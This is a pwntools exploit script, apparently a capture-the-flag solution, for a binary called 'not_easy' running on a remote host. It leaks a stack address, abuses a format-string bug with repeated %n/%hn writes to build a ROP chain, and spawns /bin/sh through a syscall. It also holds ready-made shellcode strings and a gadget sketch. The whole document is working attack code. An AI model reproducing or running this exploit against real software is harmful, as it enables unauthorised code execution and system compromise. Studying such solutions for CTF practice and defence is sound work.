#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './not_easy'
binary = ELF(program_name)

remote_server = '13.233.66.116'
PORT = 6969

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    # leak stack
    p.sendlineafter('secret password!\n','%11$p')
    p.recvline();p.recvline();
    stack = hex(int(p.recvline().strip(),16)-0xc0)
    print 'Stack leak=',stack

    # gain infinite loop (overwrite counter variable with negative value)
    payload = p32(int(stack,16)+2) + '%-125535s' + '%1$n'
    p.sendlineafter("password!\n",payload)

    # build ROP
    retaddr = hex(int(stack,16)+0x8)
    binsh = 0x80ae88c
    sub_eax = 0x08057b4b
    pop_edi = 0x08092dd2
    mov_eax = 0x08065da1
    pop_ebx = 0x08070dff
    pop_ecx = 0x080ad6f3
    pop_edx = 0x080704bb#  pop edx; ret;
    syscall = 0x0806309d
    intg = 0x08070e1e
    payload = p32(int(retaddr,16)) + '%-' + str(0x2dd2-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+2) + '%-' + str(0x0809-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+4) + '%-' + str(11-4) + 's' + '%1$n'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+8) + '%-' + str(0x5da1-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+10) + '%-' + str(0x0806-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+12) + '%-' + str(0x0dff-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+14) + '%-' + str(0x0807-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+16) + '%-' + str(0xe88c-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+18) + '%-' + str(0x080a-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = '%2$n' + p32(int(retaddr,16)+20)
    p.sendlineafter('password!\n',payload)
    payload = '%2$n' + p32(int(retaddr,16)+24)
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+28) + '%-' + str(0xd6f3-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+30) + '%-' + str(0x080a-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = '%2$n' + p32(int(retaddr,16)+32)
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+36) + '%-' + str(0x04bb-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+38) + '%-' + str(0x0807-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = '%2$n' + p32(int(retaddr,16)+40)
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+44) + '%-' + str(0x0e1e-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    payload = p32(int(retaddr,16)+46) + '%-' + str(0x0807-4) + 's' + '%1$hn'
    p.sendlineafter('password!\n',payload)
    print '>>',retaddr

    # reset counter + trigger ROP
    payload = p32(int(stack,16)+2) + '%1$n'
    p.sendlineafter("password!\n",payload)

    # ============ GDB =========== #


    p.interactive()

# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
'''
# set edi
0x08092dd2: std; pop edi; ret;
# set eax to 11
0x08065da1: push es; mov eax, edi; pop edi; ret;
# set ebx to /bin/sh
0x08070dff: nop; pop ebx; pop esi; pop edi; ret;
# set ecx null
0x080ad6f3: pop ecx; ret;
# trigger syscall
0x0806309d: syscall;

ropchain: 0x08092dd2 + 0x11 + 0x08065da1 + 0x08070dff + /bin/sh + 0 + 0 + 0x0806309d
'''
